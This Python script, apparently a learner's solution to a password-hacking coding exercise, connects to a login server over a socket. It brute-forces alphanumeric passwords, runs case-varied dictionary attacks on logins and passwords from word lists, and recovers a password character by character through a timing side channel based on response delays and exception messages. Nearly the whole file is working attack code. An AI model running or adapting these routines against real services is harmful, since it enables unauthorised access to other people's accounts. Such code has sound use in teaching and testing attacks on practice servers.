# write your code here
# write your code here
import argparse
import json
import socket
import itertools
import os
import string
import time


def send_message(host, port, msg):
    """
    send a message to the given host

    :param host: given host
    :param port: port of the host
    :param msg: message to send
    :return: None
    """
    with socket.socket() as client_socket:
        client_socket.connect((host, int(port)))
        client_socket.send(msg.encode())
        response = client_socket.recv(1024).decode()
        print(response)


def try_password(host, port):
    """
    Try the password from a to z and numbers 0 to 9
    :param host: given host
    :param port: port of the host
    :return:
    """
    with socket.socket() as client_socket:
        client_socket.connect((host, int(port)))
        pwd_alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i',
                        'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r',
                        's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0',
                        '1', '2', '3', '4', '5', '6', '7', '8', '9']
        digits = 1
        while True:
            for possible_pwd in itertools.product(pwd_alphabet, repeat=digits):
                possible_pwd = ''.join(possible_pwd)
                client_socket.send(possible_pwd.encode())
                response = client_socket.recv(1024).decode()
                if (response == "Connection success!") or (response == "Too many attempts"):
                    break
            if response == "Wrong password!":
                digits += 1
            elif response == "Connection success!":
                print(possible_pwd)
                break
            else:
                break


def upper_lower_generator(base_string):
    for i in itertools.product(*zip(base_string.upper(), base_string.lower())):
        yield "".join(i)


def try_password_with_dict(host, port):
    """
    Try the password from a to z and numbers 0 to 9
    :param host: given host
    :param port: port of the host
    :return:
    """
    with socket.socket() as client_socket:
        client_socket.connect((host, int(port)))
        passwords = open('passwords.txt', 'r')
        for password in passwords.readlines():
            for answer in upper_lower_generator(password.splitlines()[0]):  # remove the change line with splitlines
                try:
                    client_socket.send(answer.encode())
                    response = client_socket.recv(1024).decode()
                except (ConnectionAbortedError, ConnectionResetError):
                    pass
                else:
                    if response == "Connection success!":
                        print(answer)
                        passwords.close()
                        exit()


def _try_login(client_socket, require_time=False):
    """
    try all the login

    :param client_socket
    :return:
    """
    if require_time:
        time_tried = 0
        time_spent = 0
    possible_dict = open('logins.txt', 'r')
    for login in possible_dict.readlines():
        for answer in upper_lower_generator(login.splitlines()[0]):  # remove the change line with splitlines
            msg = json.dumps({'login': answer, 'password': ''})
            try:
                start = time.perf_counter()
                client_socket.send(msg.encode())
                response = client_socket.recv(1024).decode()
                end = time.perf_counter()
                if require_time:
                    time_tried += 1
                    time_spent += end - start
            except (ConnectionAbortedError, ConnectionResetError):
                pass
            else:
                response = json.loads(response)['result']
                if (response == "Wrong password!") or (response == "Exception happened during login"):
                    possible_dict.close()
                    if require_time:
                        return answer, time_spent/time_tried
                    else:
                        return answer


def _try_password(client_socket, login, avg_time=20000):
    pwd_alphabet = string.digits + string.ascii_letters
    pwd, origin_pwd = '', ''
    while True:
        for possible_letter in pwd_alphabet:
            possible_pwd = ''.join([pwd, possible_letter])
            possible_pwd_json = json.dumps({'login': login, 'password': possible_pwd})
            try:
                client_socket.send(possible_pwd_json.encode())
                start = time.perf_counter()
                response = client_socket.recv(1024).decode()
                end = time.perf_counter()
            except (ConnectionAbortedError, ConnectionResetError):
                pass
            else:
                response = json.loads(response)['result']
                if response == "Connection success!":
                    return possible_pwd_json
                elif (response == "Exception happened during login") or ((response == 'Wrong password!')
                                                                         and (end-start > 10*avg_time)):
                    pwd = possible_pwd
                    break
        if pwd == origin_pwd:
            print("Failed to Found Password!")
            break
        else:
            origin_pwd = pwd


def try_login_and_pwd(host, port):
    with socket.socket() as client_socket:
        client_socket.connect((host, int(port)))
        login, avg_time = _try_login(client_socket, require_time=True)
        if login is None:
            print("Found Login Failed!")
            return
        login_json = _try_password(client_socket, login, avg_time=avg_time)
        if login_json is None:
            print(f"Found login: {login}, but failed to find the password!")
            return
        print(login_json)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="send a message to the given host")
    parser.add_argument("host")
    parser.add_argument("port")
    # parser.add_argument("msg")

    args = parser.parse_args()
    # send_message(host=args.host, port=args.port, msg=args.msg)
    # try_password_with_dict(host=args.host, port=args.port)
    try_login_and_pwd(host=args.host, port=args.port)
